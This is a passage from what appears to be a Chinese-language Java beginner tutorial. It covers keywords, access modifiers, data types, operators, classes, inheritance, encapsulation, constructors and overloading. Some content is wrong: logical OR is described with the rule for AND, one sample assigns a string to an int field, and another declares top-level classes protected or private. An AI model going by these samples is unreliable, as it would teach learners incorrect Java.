align="center">abstract</td><td align="center">assert</td><td align="center">boolean</td><td align="center">break</td></tr><tr><td align="center">byte</td><td align="center">case</td><td align="center">catch</td><td align="center">char</td></tr><tr><td align="center">class</td><td align="center">const</td><td align="center">continue</td><td align="center">default</td></tr><tr><td align="center">do</td><td align="center">double</td><td align="center">else</td><td align="center">enum</td></tr><tr><td align="center">extends</td><td align="center">final</td><td align="center">finally</td><td align="center">float</td></tr><tr><td align="center">for</td><td align="center">goto</td><td align="center">if</td><td align="center">implements</td></tr><tr><td align="center">import</td><td align="center">instanceof</td><td align="center">int</td><td align="center">interface</td></tr><tr><td align="center">long</td><td align="center">native</td><td align="center">new</td><td align="center">package</td></tr><tr><td align="center">private</td><td align="center">protected</td><td align="center">public</td><td align="center">return</td></tr><tr><td align="center">short</td><td align="center">static</td><td align="center">strictfp</td><td align="center">super</td></tr><tr><td align="center">switch</td><td align="center">synchronized</td><td align="center">this</td><td align="center">throw</td></tr><tr><td align="center">throws</td><td align="center">transient</td><td align="center">try</td><td align="center">void</td></tr><tr><td align="center">volatile</td><td align="center">while</td><td align="center"></td><td align="center"></td></tr></tbody></table><h2 id="3-修饰符"><a href="#3-修饰符" class="headerlink" title="3.修饰符"></a>3.修饰符</h2><p>public</p><p><strong>·含义</strong>：完全公开，可在任意地方访问</p><p><strong>·使用场景</strong>：希望类的实例能在任意地方被创建和访问，或者编写库(library)的一部分，希望其他开发者能使用这个类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Myclass</span>&#123;<br>    <span class="hljs-comment">//类的定义</span><br>&#125;<br></code></pre></td></tr></table></figure><p>default</p><p><strong>·含义</strong>：没有使用任何修饰符，默认可见性为包级别，只能在同一个包访问</p><p><strong>·使用场景</strong>：希望类在同一个包的其它类能够访问</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Myclass</span>&#123;<br>    <br>&#125;<br></code></pre></td></tr></table></figure><p>protected</p><p><strong>·含义</strong>：可以被同一个包的其它类访问，以及该类的子类（无论在哪个包）</p><p><strong>·使用场景</strong>：通常用于修饰成员变量和方法，当你希望子类能够访问类的成员，但其它类不能访问时使用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Myclass</span>&#123;<br>    <br>&#125;<br></code></pre></td></tr></table></figure><p>private</p><p><strong>·含义</strong>：使用private修饰符的类只能被同一类中其他类访问，通常用于嵌套类或内部实现细节</p><p><strong>·使用场景</strong>：将类的细节隐藏在同一类的内部，不让其他类直接访问</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Myclass</span> &#123;<br>    <br>&#125;<br></code></pre></td></tr></table></figure><p>举例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OuterClass</span>&#123;<br>    <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="4-数据类型"><a href="#4-数据类型" class="headerlink" title="4.数据类型"></a>4.数据类型</h2><p>整型：byteshortintlong</p><p>浮点型：floatdouble</p><p>字符型：char</p><p>布尔型：boolean</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span> <span class="hljs-variable">integerVariable</span> <span class="hljs-operator">=</span> <span class="hljs-number">1111</span>;<br><span class="hljs-type">double</span> <span class="hljs-variable">doubleVariable</span> <span class="hljs-operator">=</span> <span class="hljs-number">11.11</span>;<br><span class="hljs-type">char</span> <span class="hljs-variable">charVariable</span> <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;E&#x27;</span>;<br><span class="hljs-type">boolean</span> <span class="hljs-variable">booleanVariable</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>/<span class="hljs-literal">false</span>;<br></code></pre></td></tr></table></figure><h2 id="5-变量"><a href="#5-变量" class="headerlink" title="5.变量"></a>5.变量</h2><p>先声明后使用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span> <span class="hljs-variable">x</span> <span class="hljs-operator">=</span> <span class="hljs-number">11</span>;<br><span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;e1even&quot;</span>;        <span class="hljs-comment">//String是引用数据类型，是一个类</span><br></code></pre></td></tr></table></figure><h2 id="6-基本运算符"><a href="#6-基本运算符" class="headerlink" title="6.基本运算符"></a>6.基本运算符</h2><p>算术运算符：+-*&#x2F;%++–</p><p>关系运算符：&#x3D;&#x3D;!&#x3D;&lt;&gt;&lt;&#x3D;&gt;&#x3D;</p><p>逻辑运算符：&amp;&amp;||!</p><p>​  与 或     非</p><p>与：都真才真</p><p>或：有假则假</p><p>非：取相反的</p><p>位运算符：&amp;|^~&lt;&lt;&gt;&gt;&gt;&gt;&gt;</p><h2 id="7-顺序结构"><a href="#7-顺序结构" class="headerlink" title="7.顺序结构"></a>7.顺序结构</h2><p>逐行执行</p><h2 id="8-选择结构"><a href="#8-选择结构" class="headerlink" title="8.选择结构"></a>8.选择结构</h2><p>选择执行不同</p><p>if</p><p>if-else(else if)</p><p>switch</p><h2 id="9-循环结构"><a href="#9-循环结构" class="headerlink" title="9.循环结构"></a>9.循环结构</h2><p>多次执行相同</p><p>for（跟c格式差不多）</p><p>while</p><p>do-while</p><h2 id="10-数组"><a href="#10-数组" class="headerlink" title="10.数组"></a>10.数组</h2><p>存储相同类型</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span>[] numbers=&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>&#125;;<br></code></pre></td></tr></table></figure><h2 id="11-函数"><a href="#11-函数" class="headerlink" title="11.函数"></a>11.函数</h2><p> 方法名，参数列表，返回类型和方法体</p><p>普通方法：实例化对象调用</p><p>静态方法：通过类名直接调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">common</span>&#123;<br><span class="hljs-comment">//普通方法</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">printMessage</span><span class="hljs-params">(String message)</span>&#123;<br>System.out.println(message);<br>&#125;<br><span class="hljs-comment">//静态方法</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>        <span class="hljs-type">common</span> <span class="hljs-variable">myObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">common</span>();<br>        myObject.printMessage(<span class="hljs-string">&quot;Hello, World!&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>无返回值：void</p><h2 id="12-JAVA异常处理"><a href="#12-JAVA异常处理" class="headerlink" title="12.JAVA异常处理"></a>12.JAVA异常处理</h2><p>try:尝试运行</p><p>catch:如果try中发生异常，跳转到catch。并且捕获异常</p><p>finally:无论是否发生异常都运行，通常用于释放或清理工作</p><h1 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h1><p>把一些事物抽象成对象</p><p>如一个积木块</p><p>有它的<strong>属性</strong>：形状，颜色，大小</p><p>也有<strong>行为</strong>：如何拼接在一起</p><h2 id="1-类"><a href="#1-类" class="headerlink" title="1.类"></a>1.类</h2><p>两个不同的类别，有着不同的特征和行为</p><p>它定义了对象的属性（成员变量）和行为（方法）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//定义一个person类</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">person</span>&#123;<br><span class="hljs-keyword">private</span> String features;<br><span class="hljs-keyword">private</span> String job;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-对象"><a href="#2-对象" class="headerlink" title="2.对象"></a>2.对象</h2><p>对象是类的实例</p><p>实例化是为了创建对象，也就是我们使用类这个模板，以及可以进行自己所需的改动；</p><p>例子：我们从网上下载PPT模板，然后修改所需内容</p><p>我们实例化一个对象过程通常包括使用<strong>new</strong>关键字来调用类的构造方法，并为对象分配内存空间 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">person</span>&#123;<br>    <span class="hljs-comment">//类的属性</span><br>    String name;<br>    <span class="hljs-type">int</span> age;<br>    <br>    <span class="hljs-comment">//类的方法</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">say</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;1111&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>        <span class="hljs-comment">//实例化</span><br>        <span class="hljs-type">person</span> <span class="hljs-variable">e1even</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">person</span>();<br>        <br>        <span class="hljs-comment">//设置属性值</span><br>        e1even.name=<span class="hljs-string">&quot;e1even&quot;</span>;<br>        e1even.age=<span class="hljs-string">&quot;20&quot;</span>;<br>        <br>        <span class="hljs-comment">//调用</span><br>        e1even.say();<br>        <br>        <span class="hljs-comment">//输出属性值</span><br>        System.out.println(<span class="hljs-string">&quot;名字：&quot;</span> + e1even.name);<br>        System.out.println(<span class="hljs-string">&quot;年龄：&quot;</span> + e1even.age);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406141121001.png" alt="image-20240409232449173"></p><h2 id="3-继承（extends）"><a href="#3-继承（extends）" class="headerlink" title="3.继承（extends）"></a>3.继承（extends）</h2><p>允许一个（子）类继承（父）类的属性和方法。子类可以继承父类的行为，并且可以通过添加新的属性和方法来扩展功能</p><p>解决：代码重用和扩展</p><p>实现：功能的扩展和定制</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">People</span> &#123;<br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">zuo</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;zuo&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">worker</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">People</span>&#123;<br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">shuo</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;shuo&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">worker</span> <span class="hljs-variable">me</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">worker</span>();<br><br>        me.shuo();<br><br>        me.zuo();<br>    &#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>注意：Main里面是worker</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406141121318.png" alt="image-20240410171654198"></p><h2 id="4-封装"><a href="#4-封装" class="headerlink" title="4.封装"></a>4.封装</h2><p>将对象的内部状态和实现细节隐藏起来，只对外提供访问接口。</p><p>通过访问修饰符实现</p><p>解决：对象安全性和灵活性。</p><p>使对象能够以受控制的方式按外部访问和修改。 </p><p>get</p><p>set</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br><br>    <span class="hljs-comment">//getter方法，用于获取name属性</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.name;<br>    &#125;<br>    <span class="hljs-comment">//setter方法，用于设置name属性值，并进行非空验证</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String newName)</span> &#123;<br>        <span class="hljs-keyword">if</span> (newName != <span class="hljs-literal">null</span> &amp;&amp; !newName.isEmpty())&#123;<br>            <span class="hljs-built_in">this</span>.name=newName;<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;Name cannot be null or empty&quot;</span>);<br>        &#125;<br>    &#125;<br><span class="hljs-comment">//get方法，获取age</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.age;<br>    &#125;<br><span class="hljs-comment">//设置age</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> newAge)</span>&#123;<br>        <span class="hljs-keyword">if</span> (newAge &gt;= <span class="hljs-number">0</span> &amp;&amp; newAge &lt;= <span class="hljs-number">100</span>)&#123;<br>            <span class="hljs-built_in">this</span>.age = newAge;<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;Age must be between 0 and 100&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>        <span class="hljs-comment">//创建个Person对象</span><br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br><span class="hljs-comment">//设置属性</span><br>        person.setName(<span class="hljs-string">&quot;e1even&quot;</span>);<br>        person.setAge(<span class="hljs-number">20</span>);<br><span class="hljs-comment">//get并输出</span><br>        System.out.println(<span class="hljs-string">&quot;名字：&quot;</span>+person.getName());<br>        System.out.println(<span class="hljs-string">&quot;年龄：&quot;</span>+person.getAge());<br><span class="hljs-comment">//设置无效值</span><br>        person.setName(<span class="hljs-string">&quot;&quot;</span>);<br>        person.setAge(<span class="hljs-number">10086</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406141121354.png" alt="image-20240410212039791"></p><h2 id="5-构造函数"><a href="#5-构造函数" class="headerlink" title="5.构造函数"></a>5.构造函数</h2><p>特殊的方法，与类同名，没有返回类型，在对象被创建时调用，用于<strong>初始化</strong>操作。</p><p>目的：确保对象在被使用之前处于一个合理的状态</p><p>如果你没有为类定义任何构造函数，JAVA编译器会为你生成一个默认的无参数构造函数，并执行以下操作：</p><p>​·将类的实例变量初始化为默认值（0，false，null）</p><p>​·如果是继承，调用父类无参数构造函数</p><p>分类：有参&#x2F;无参</p><p><strong>如果你显式地提供了自定义的构造函数（无论是有参数的还是无参数的），并且没有提供任何无参数构造函数，那么默认的无参数构造函数就不再自动生成。</strong></p><p><strong>也就是说除非目标类显示的自定义了无参构造函数，否则如果目标类只定义了有参构造函数的话，那就不会默认生成无参构造函数了。</strong></p><p>解决的问题：</p><p>构造函数解决了对象初始化的问题。通过构造函数，可以为对象的属性赋予初始值，执行必要的设置，使对象能够在创建时就具备正确的状态。</p><p>无参:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br>    <span class="hljs-comment">//构造函数初始值</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-built_in">this</span>.name = <span class="hljs-string">&quot;e1even&quot;</span>;<br>        <span class="hljs-built_in">this</span>.age = <span class="hljs-number">20</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//实例化</span><br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br><br>        <span class="hljs-comment">//获取信息并打印</span><br>        System.out.println(<span class="hljs-string">&quot;name:&quot;</span> + person.getName() + <span class="hljs-string">&quot; age:&quot;</span> + person.getAge());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406141121324.png" alt="image-20240410214942628"></p><p>有参:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br>    <span class="hljs-comment">//有参构造函数，接受命名和年龄</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span>&#123;<br>        <span class="hljs-built_in">this</span>.name=name;<br>        <span class="hljs-built_in">this</span>.age=age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//实例化</span><br>        <span class="hljs-type">Person</span> <span class="hljs-variable">me</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;e1even&quot;</span>,<span class="hljs-number">20</span>);<br><br>        <span class="hljs-comment">//获取信息并打印</span><br>        System.out.println(<span class="hljs-string">&quot;name:&quot;</span> + me.getName() + <span class="hljs-string">&quot; age:&quot;</span> + me.getAge());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>出来的效果是一样的</p><h3 id="继承中的构造函数"><a href="#继承中的构造函数" class="headerlink" title="继承中的构造函数"></a>继承中的构造函数</h3><p><strong>默认情况：</strong></p><ul><li>如果父类（基类）有一个无参数的构造函数，子类（派生类）会自动继承这个无参数构造函数。</li><li>如果子类没有显式定义构造函数，编译器会默认生成一个无参数构造函数，并在其中调用父类的无参数构造函数。</li></ul><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs scala"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Animal</span> </span>&#123;<br>    <span class="hljs-comment">// 父类有一个无参数构造函数</span><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Dog</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Animal</span> </span>&#123;<br>    <span class="hljs-comment">// 子类没有显式定义构造函数，编译器默认生成一个无参数构造函数</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>父类有有参数构造函数：</strong></p><ul><li>如果父类只提供了有参数的构造函数，子类需要显式定义构造函数，并通过<code>super()</code>调用适当的父类构造函数。此时 <code>super()</code>方法是必须的。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Animal</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-comment">// 父类有一个有参数构造函数</span><br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Dog</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Animal</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Dog</span><span class="hljs-params">(String name, String breed)</span> &#123;<br>        <span class="hljs-built_in">super</span>(name); <span class="hljs-comment">// 调用父类的有参数构造函数</span><br>        <span class="hljs-comment">// 初始化子类特有的属性</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>子类提供无参数构造函数：</strong></p><ul><li>如果父类没有提供无参数构造函数，但子类需要使用无参数构造函数，子类需要显式提供无参数构造函数，并通过<code>super()</code>调用适当的父类构造函数。此时 <code>super()</code>方法是必须的。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Animal</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-comment">// 父类有一个有参数构造函数</span><br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Dog</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Animal</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Dog</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">super</span>(<span class="hljs-string">&quot;DefaultName&quot;</span>); <span class="hljs-comment">// 调用父类的有参数构造函数</span><br>        <span class="hljs-comment">// 子类提供无参数构造函数，并在其中调用父类构造函数</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>总的来说，继承和构造函数的关系取决于父类的构造函数情况。在设计时，需要考虑如何在子类中正确地初始化父类的状态。</p><h2 id="6-函数方法重载"><a href="#6-函数方法重载" class="headerlink" title="6.函数方法重载"></a>6.函数方法重载</h2><p>具有相同的<strong>方法名</strong>但具有不同的<strong>参数列表</strong></p><p>编译器根据方法的参数数量，类型或顺序来选择合适的方法</p><p>如计算器可以同时有整型，浮点型，字符型（Π）的加法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">calc</span>&#123;<br><span class="hljs-comment">//重载</span><br><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">add</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)</span>&#123;<br>        <span class="hljs-keyword">return</span> a+b;<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title 